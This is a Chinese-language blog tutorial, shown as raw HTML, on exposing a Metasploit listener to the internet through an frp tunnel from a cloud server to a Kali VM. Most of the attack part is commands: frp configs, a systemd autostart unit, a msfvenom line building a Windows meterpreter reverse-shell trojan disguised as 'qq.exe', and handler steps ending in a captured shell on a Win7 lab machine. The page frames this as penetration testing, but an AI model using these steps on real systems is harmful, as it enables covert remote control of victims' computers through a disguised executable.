@@ -1,0 +1,222 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><meta name="msvalidate.01" content="bing-key"/><meta name="google-site-verification" content="google-key"/><meta name="yandex-verification" content="yandex-key"/><meta name="baidu-site-verification" content="baidu-key"/><link rel="alternate" href="/rss.xml" title="Sycamore's Blog" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="Sycamore's Blog" type="application/atom+xml"><link rel="alternate" type="application/json" title="Sycamore's Blog" href="https://www.sycamore.top/feed.json"/><link rel="stylesheet" href="//fonts.geekzu.org/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.1.1"><script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.js"></script><link rel="stylesheet" href="https://unpkg.com/@waline/client@v3/dist/waline.css"/><meta name="keywords" content="Linux,Trojan horse,frp"/><link rel="canonical" href="https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/frp-%E6%90%AD%E5%BB%BA%E5%85%AC%E7%BD%91-Metasploit/"><title>frp 搭建公网 Metasploit - </title><meta name="generator" content="Hexo 7.1.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">frp 搭建公网 Metasploit</h1><div class="meta"><span class="item" title="创建时间：2022-04-18 20:18:36"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2022-04-18T20:18:36+08:00">2022-04-18</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>6.2k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>6 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Sycamore</a></li></ul><ul class="right" id="rightNav"><li class="item theme" @click="changeThemeByBtn"><i class="ic" :class="{'i-sun': !themeStatus,'i-moon': themeStatus}"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><img src="https://res.cloudinary.com/sycamore/image/upload/v1682442126/Typera/2023/04/87d91c5d20cc130aa72fe99c74a9e8c2.png"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 20 150 24" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/CyberSecurity/" itemprop="item" rel="index" title="分类于CyberSecurity"><span itemprop="name">CyberSecurity<meta itemprop="position" content="0"/></span></a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/CyberSecurity/%E6%9C%A8%E9%A9%AC/" itemprop="item" rel="index" title="分类于木马"><span itemprop="name">木马<meta itemprop="position" content="1"/></span></a></span><i class="ic i-angle-right"></i></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/frp-%E6%90%AD%E5%BB%BA%E5%85%AC%E7%BD%91-Metasploit/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"/><meta itemprop="name" content="Sycamore"/><meta itemprop="description" content="瑣憶流金, "/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="Sycamore's Blog"/></span><div class="body md" itemprop="articleBody"><h2 id="准备"><a class="anchor" href="#准备">#</a> 准备</h2>
+<ul>
+<li><strong>frps</strong> 部署机。
+<ul>
+<li>要求：拥有 <strong>公网 IP</strong> （例如 <strong>VPS</strong>、云服务器等等）</li>
+<li>本文选用 <strong>Ubuntu 18.04.6</strong> 云服务器</li>
+</ul>
+</li>
+<li><strong>frpc</strong> 客户机。
+<ul>
+<li>要求：能访问互联网</li>
+<li>本文选用 <strong>Kali Linux 2022</strong> 虚拟机</li>
+</ul>
+</li>
+<li><strong>frp</strong> 的 <strong>Github</strong> 项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycA==">fatedier/frp</span></li>
+</ul>
+<h2 id="frps云服务器"><a class="anchor" href="#frps云服务器">#</a> frps（云服务器）</h2>
+<h3 id="下载安装"><a class="anchor" href="#下载安装">#</a> 下载安装</h3>
+<p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp"><strong>Github</strong> 项目</a> 上找到最新的 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9yZWxlYXNlcw==">releases</span> ：<br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442796/Typera/2023/04/65c0edabf7c4cf7b431c9f10ff94bc05.png" alt="image-20230426011312770" /></p>
+<ol>
+<li>在 <strong>云服务器</strong> 终端上下载： <code>wget https://github.com/fatedier/frp/releases/download/v0.41.0/frp_0.41.0_linux_amd64.tar.gz</code> <br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442806/Typera/2023/04/d8b546285137f60d42fef4a27a06d821.png" alt="image-20230426011322302" /></li>
+<li><strong>解压缩</strong> 下载的文件： <code>tar -zxvf frp_0.41.0_linux_amd64.tar.gz</code> <br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442811/Typera/2023/04/4063a698f14734b0fb54a92974122ba5.png" alt="image-20230426011327257" /></li>
+<li><strong>进入</strong> 解压缩的文件夹： <code>cd frp_0.41.0_linux_amd64/</code></li>
+<li>因为配置的是 <strong>frps</strong> ，可以 <strong>删除</strong> 文件夹内的 <strong>frpc</strong> 相关文件，防止后续修改出错：<strong> <code>rm -rf frpc*</code> </strong><br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442816/Typera/2023/04/f776553aeca109b5eef6a7e0d3d6bacd.png" alt="image-20230426011332064" /></li>
+</ol>
+<h3 id="编写-frps-配置文件"><a class="anchor" href="#编写-frps-配置文件">#</a> 编写 frps 配置文件</h3>
+<p><code>vim frps.ini</code> <br />
+ 内容如下：<br />
+（不想要<strong>监控页面</strong>的话，删除对应配置所在 <strong>行</strong> 即可）<br />
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7777          # frps和frpc的通讯端口</span><br><span class="line">dashboard_port = 9999     # web监控页面的端口</span><br><span class="line">dashboard_user = Sycamore # 登录监控页面的用户名</span><br><span class="line">dashboard_pwd = 123456    # 登录监控页面的密码</span><br></pre></td></tr></table></figure><br />
+ 如图所示：<br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442822/Typera/2023/04/02f8cca9459920e2f031c95fec4c172e.png" alt="image-20230426011338410" /><br />
+（需要 <strong>云服务器</strong> 打开 <strong>对应端口</strong>：7777、9999)</p>
+<h3 id="运行"><a class="anchor" href="#运行">#</a> 运行</h3>
+<p>相关命令 <strong>基本上</strong> 应当在 <strong>frp_0.41.0_linux_amd64 文件夹</strong> 下执行～</p>
+<ul>
+<li>命令行输入： <code>./frps -c frps.ini</code>
+<ul>
+<li><strong>[注意]</strong>：关闭命令行窗口，或是停止执行该命令，就会 <strong>退出</strong></li>
+</ul>
+</li>
+<li>后台运行： <code>nohup ./frps -c frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;</code>
+<ul>
+<li>因为通常不会 <strong>关闭云服务器</strong>，所以 <strong>后台运行</strong> 就足够了；</li>
+<li>当然也可以 <strong>开启自启动</strong>，详情见 <strong>frpc</strong> 的内容，对应命令改个符号就行～</li>
+</ul>
+</li>
+</ul>
+<h2 id="frpckali-虚拟机"><a class="anchor" href="#frpckali-虚拟机">#</a> frpc（Kali 虚拟机）</h2>
+<p><img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442827/Typera/2023/04/692976286e5ddec8cd744326a1c3a54d.png" alt="image-20230426011342973" /></p>
+<h3 id="下载安装-2"><a class="anchor" href="#下载安装-2">#</a> 下载安装</h3>
+<p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp"><strong>Github</strong> 项目</a> 上找到最新的 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9yZWxlYXNlcw==">releases</span></p>
+<p>步骤与 <strong>frps</strong> 的几乎<strong>相同</strong>，<strong>区别</strong> 是：</p>
+<ul>
+<li>对象变成了 <strong>Kali 虚拟机</strong>，而不是 云服务器</li>
+<li>以及最后一步 <strong>删除的是 frps</strong>：<br />
+4. 因为配置的是 <strong>frpc</strong> ，可以 <strong>删除</strong> 文件夹内的 <strong>frps</strong> 相关文件，防止后续修改出错：<strong> <code>rm -rf frps*</code> </strong></li>
+</ul>
+<h3 id="编写-frpc-配置文件"><a class="anchor" href="#编写-frpc-配置文件">#</a> 编写 frpc 配置文件</h3>
+<p>作为一款 <strong>内网穿透</strong> 工具，<strong>frp</strong> 穿透了内网之后，还需要使用 <strong>其他手段</strong>（<strong>ssh</strong>）<br />
+和外网建立交互，所以 <strong>配置文件</strong> 中会存在 <strong>[ssh]</strong> 配置。</p>
+<p><code>vim frpc.ini</code> <br />
+ 内容如下：<br />
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 106.15.52.194</span><br><span class="line">server_port = 7777</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 6666</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure><br />
+ 相关 <strong>解释</strong> 如图：<br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442834/Typera/2023/04/2144e375ff1aca162bb41868d050259f.png" alt="image-20230426011350366" /></p>
+<h3 id="运行-2"><a class="anchor" href="#运行-2">#</a> 运行</h3>
+<p>相关命令 <strong>基本上</strong> 应当在 <strong>frp_0.41.0_linux_amd64 文件夹</strong> 下执行～</p>
+<ul>
+<li>命令行输入： <code>./frpc -c frpc.ini</code>
+<ul>
+<li><strong>[注意]</strong>：关闭命令行窗口，或是停止执行该命令，就会 <strong>退出</strong></li>
+</ul>
+</li>
+<li>开机自启动：
+<ul>
+<li>服务目录 <strong>新建并编辑</strong> 文件： <code>vim /lib/systemd/system/frp.service</code></li>
+<li>填入以下内容：<br />
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Frp Client Service</span><br><span class="line">After=network.target remote-fs.target nss-lookup.target</span><br><span class="line">Wants=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=/root/frp/frpc -c /root/frp/frpc.ini</span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=20s</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></li>
+<li>启动 <strong>frpc</strong> 服务： <code>systemctl start frp</code> <br />
+（最后的  <code>frp</code>  名称取决于上一步新建的文件名  <code>frp.service</code> ）</li>
+<li>打开 <strong>frpc</strong> 服务自启动  <code>systemctl enable frp</code> <br />
+<strong> [注意]：</strong>
+<ul>
+<li>如果要重启应用： <code>systemctl restart frp</code></li>
+<li>如果要停止应用： <code>systemctl stop frp</code></li>
+<li>如果要查看 <strong>frpc</strong> 的日志： <code>systemctl status frp</code></li>
+<li>权限不够，记得加  <code>sudo</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>服务文件</strong> 重要内容注释 如下图：<br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442841/Typera/2023/04/6e79855b87a38703bd5b740419dc6e65.png" alt="image-20230426011356634" /></p>
+<h2 id="ssh-连接测试"><a class="anchor" href="#ssh-连接测试">#</a> SSH 连接测试</h2>
+<ul>
+<li>命令行  <code>ssh root@x.x.x.x -p 6666</code> <br />
+（<strong>root</strong> 用户登录到 <strong>云服务器 x.x.x.x</strong> 的 <strong>6666</strong> 端口）<br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442846/Typera/2023/04/52501488b9125c9518e2190783a8fcf4.png" alt="" /></li>
+<li>Xshell 创建新会话，具体内容如下：<br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442854/Typera/2023/04/891e33c279efacbf48adee134034f971.png" alt="image-20230426011410382" /><img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442861/Typera/2023/04/fe85e7d6d6e0e5955c77ff87a4ea5abe.png" alt="image-20230426011417120" /><br />
+&lt;br&gt;<br />
+<strong>Xshell  连接成功</strong>：<br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442869/Typera/2023/04/7eed7e40069de144ddcfb74725077325.png" alt="image-20230426011424294" /></li>
+</ul>
+<h2 id="msf-渗透攻击测试"><a class="anchor" href="#msf-渗透攻击测试">#</a> msf 渗透攻击测试</h2>
+<p>双击打开 刚刚建立的 <strong>Xshell 新会话</strong>（ frp ）.</p>
+<h3 id="frpc-添加新配置"><a class="anchor" href="#frpc-添加新配置">#</a> frpc 添加新配置</h3>
+<p>输入命令： <code>vim frpc.ini</code> ，编辑 <strong>frpc</strong> 配制文件，<br />
+在文件末尾 <strong>添加</strong>：<br />
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 4444</span><br><span class="line">remote_port = 2333 </span><br></pre></td></tr></table></figure><br />
+ 配置内容的 <strong>含义</strong> 与 <strong>[ssh]</strong> 类似，解释如图：<br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442874/Typera/2023/04/75402a4aa7e5b6970ffb51313c0a847f.png" alt="image-20230426011431000" /></p>
+<h3 id="msf-生成木马"><a class="anchor" href="#msf-生成木马">#</a> msf 生成木马</h3>
+<p>与连接 <strong>本地的 shell</strong> 生成木马不同，<br />
+因为我们要使用 <strong>frp 穿透内网</strong> 连接的 shell ，去 <strong>监听木马反弹</strong>的 shell，<br />
+所以我们 <strong>生成木马</strong> 时，设置的 LHOST、LPORT 应当是 <strong>云服务器</strong> 的对应数据。<br />
+（直接用内网测试的时候，LHOST、LPORT 填的是 <strong>本地虚拟机</strong> 的相关数据）</p>
+<p>用 <strong>msf</strong> 生成 <strong>windows</strong> 系统的 <strong>反向 shell</strong> 木马：<br />
+ <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f exe &gt; qq.exe</code> <br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442881/Typera/2023/04/f72e4363a982738b25b5976722ab8948.png" alt="image-20230426011437323" /><br />
+ 成功生成木马文件：<strong>qq.exe</strong></p>
+<h3 id="msf-监听反弹的-shell"><a class="anchor" href="#msf-监听反弹的-shell">#</a> msf 监听反弹的 shell</h3>
+<blockquote>
+<p>（确定 frps 、frpc 服务均已在后台运行）<br />
+（事先上传 qq.exe 到测试的靶机，本文用 	Win7_x64 虚拟机替代）</p>
+</blockquote>
+<blockquote>
+<p>关于<strong>上传</strong>：Kali 虚拟机 开启 <strong>Apache2</strong> 服务，Win7_x64 虚拟机 内网访问下载：<br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442886/Typera/2023/04/79c8bcdd330dc38041cee9fa333d9bb8.png" alt="" /></p>
+</blockquote>
+<ol>
+<li><code>msfconsole</code>
+<ul>
+<li>打开 <strong>msf</strong></li>
+</ul>
+</li>
+<li><code>use exploit/multi/handler</code>
+<ul>
+<li>选择使用的 exploit</li>
+</ul>
+</li>
+<li><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>
+<ul>
+<li>设置 PAYLOAD （生成木马时使用的）</li>
+</ul>
+</li>
+<li><code>set LHOST 127.0.0.1</code>
+<ul>
+<li>设置 LHOST 为本地 IP</li>
+</ul>
+</li>
+<li><code>set LPORT 4444</code>
+<ul>
+<li>设置 LPORT 为转发的本地端口 4444</li>
+</ul>
+</li>
+<li>run
+<ul>
+<li>开始监听</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<p>（先让 <strong>msf</strong> 开始监听，再双击运行上传的木马文件）</p>
+</blockquote>
+<p>演示如图所示：</p>
+<ul>
+<li>双击 <strong>运行木马</strong>：<br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442892/Typera/2023/04/553d087d53826c0f6f0bc2edf848b2b0.png" alt="image-20230426011447735" /><br />
+&lt;br&gt;</li>
+<li>msf <strong>开始监听</strong> &amp; 成功获得 meterpreter <strong>shell</strong>：<br />
+<img data-src="https://res.cloudinary.com/sycamore/image/upload/v1682442902/Typera/2023/04/204ea56873200eb9b2507252955adb2a.png" alt="image-20230426011457351" /></li>
+</ul>
+<div class="tags"><a href="/tags/Linux/" rel="tag"><i class="ic i-tag"></i>Linux</a><a href="/tags/Kali/" rel="tag"><i class="ic i-tag"></i>Kali</a><a href="/tags/Trojan-horse/" rel="tag"><i class="ic i-tag"></i>Trojan horse</a><a href="/tags/Metasploit/" rel="tag"><i class="ic i-tag"></i>Metasploit</a><a href="/tags/frp/" rel="tag"><i class="ic i-tag"></i>frp</a></div></div><footer><div class="meta"><span class="icon"><i class="ic i-eye"></i></span><span>此文章已被阅读次数:</span><span class="waline-pageview-count" id="twikoo_visitors" data-path="CyberSecurity/木马/frp-搭建公网-Metasploit/">正在加载...</span><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于</span><time title="修改时间：2024-02-28 21:33:26" itemprop="dateModified" datetime="2024-02-28T21:33:26+08:00">2024-02-28</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/assetswechatpay" alt="Sycamore /wechatpay.png"/><p>/wechatpay.png</p></div><div><img data-src="/assetsalipay" alt="Sycamore /alipay.png"/><p>/alipay.png</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>Sycamore<i class="ic i-at"><em>@</em></i>Sycamore's Blog</li><li class="link"><strong>本文链接：</strong><a href="https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/frp-%E6%90%AD%E5%BB%BA%E5%85%AC%E7%BD%91-Metasploit/" title="frp 搭建公网 Metasploit">https://www.sycamore.top/CyberSecurity/木马/frp-搭建公网-Metasploit/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%8D%86%E7%BB%91%E5%B7%A5%E5%85%B7shellter%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;res.cloudinary.com&#x2F;sycamore&#x2F;image&#x2F;upload&#x2F;v1682443290&#x2F;Typera&#x2F;2023&#x2F;04&#x2F;d9bcdac19a99f14fe88a3ed9e829d637.png" title="免杀捆绑工具 shellter 的安装及使用"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>木马</span><h3>免杀捆绑工具 shellter 的安装及使用</h3></a></div><div class="item right"><a href="/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E6%B5%8B%E8%AF%95/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;res.cloudinary.com&#x2F;sycamore&#x2F;image&#x2F;upload&#x2F;v1682443502&#x2F;Typera&#x2F;2023&#x2F;04&#x2F;38939d28722be4a8ad01b5cca9bd13a1.png" title="免杀木马测试"><span class="type">下一篇</span><span class="category"><i class="ic i-flag"></i>木马</span><h3>免杀木马测试</h3></a></div></div><div class="warp" id="wcomments"></div><script type="module" data-pjax="data-pjax">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+
+var path = document.getElementById("twikoo_visitors").getAttribute("data-path");
+setTimeout(function () {
+    init({
+        el: '#wcomments',
+        serverURL: 'https://vercel.sycamore.top',
+        lang: 'zh-CN',
+        locale: {"placeholder":"1. 提问前请先仔细阅读本文档⚡\n2. 页面显示问题💥，请提供控制台截图📸或者您的测试网址\n3. 其他任何报错💣，请提供详细描述和截图📸，祝食用愉快💪"},
+        emoji: ["https://unpkg.com/@waline/emojis@1.0.1/weibo","https://unpkg.com/@waline/emojis@1.0.1/alus","https://unpkg.com/@waline/emojis@1.0.1/bilibili","https://unpkg.com/@waline/emojis@1.0.1/qq","https://unpkg.com/@waline/emojis@1.0.1/tieba","https://unpkg.com/@waline/emojis@1.0.1/tw-emoji"],
+        meta: ["nick","mail","link"],
+        requiredMeta: ["nick","mail"],
+        wordLimit: 1000,
+        pageSize: 10,
+        pageview: true,
+        path: path
+    });
+}, 1000)</script></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text"> 准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#frps%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">2.</span> <span class="toc-text"> frps（云服务器）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85"><span class="toc-number">2.1.</span> <span class="toc-text"> 下载安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99-frps-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text"> 编写 frps 配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C"><span class="toc-number">2.3.</span> <span class="toc-text"> 运行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#frpckali-%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-number">3.</span> <span class="toc-text"> frpc（Kali 虚拟机）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85-2"><span class="toc-number">3.1.</span> <span class="toc-text"> 下载安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99-frpc-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">3.2.</span> <span class="toc-text"> 编写 frpc 配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-2"><span class="toc-number">3.3.</span> <span class="toc-text"> 运行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">4.</span> <span class="toc-text"> SSH 连接测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf-%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95"><span class="toc-number">5.</span> <span class="toc-text"> msf 渗透攻击测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#frpc-%E6%B7%BB%E5%8A%A0%E6%96%B0%E9%85%8D%E7%BD%AE"><span class="toc-number">5.1.</span> <span class="toc-text"> frpc 添加新配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">5.2.</span> <span class="toc-text"> msf 生成木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9%E7%9A%84-shell"><span class="toc-number">5.3.</span> <span class="toc-text"> msf 监听反弹的 shell</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li ><a href="/CyberSecurity/%E6%9C%A8%E9%A9%AC/Metasploit-%E6%9C%A8%E9%A9%AC%E7%BC%96%E8%AF%91%E5%88%A9%E7%94%A8/" rel="bookmark" title="Metasploit 木马编译利用">Metasploit 木马编译利用</a></li><li ><a href="/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%8D%86%E7%BB%91%E5%B7%A5%E5%85%B7shellter%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/" rel="bookmark" title="免杀捆绑工具 shellter 的安装及使用">免杀捆绑工具 shellter 的安装及使用</a></li><li  class="active"><a href="/CyberSecurity/%E6%9C%A8%E9%A9%AC/frp-%E6%90%AD%E5%BB%BA%E5%85%AC%E7%BD%91-Metasploit/" rel="bookmark" title="frp 搭建公网 Metasploit">frp 搭建公网 Metasploit</a></li><li ><a href="/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E6%B5%8B%E8%AF%95/" rel="bookmark" title="免杀木马测试">免杀木马测试</a></li><li ><a href="/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%8F%8D%E5%BC%B9-shell/" rel="bookmark" title="反弹_shell">反弹_shell</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Sycamore" data-src="/assets/avatar.jpg"/><p class="name" itemprop="name">Sycamore</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">37</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">17</span><span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">37</span><span class="name">标签</span></a></div></nav><div class="social"><a href="https://github.com/noneSycamore" title="https:&#x2F;&#x2F;github.com&#x2F;noneSycamore" class="item github" rel="noopener" target="_blank"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a><ul class="submenu"><li class="item"><a href="/about/" rel="section"><i class="ic i-cloud"></i>关于本站</a></li></ul></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a 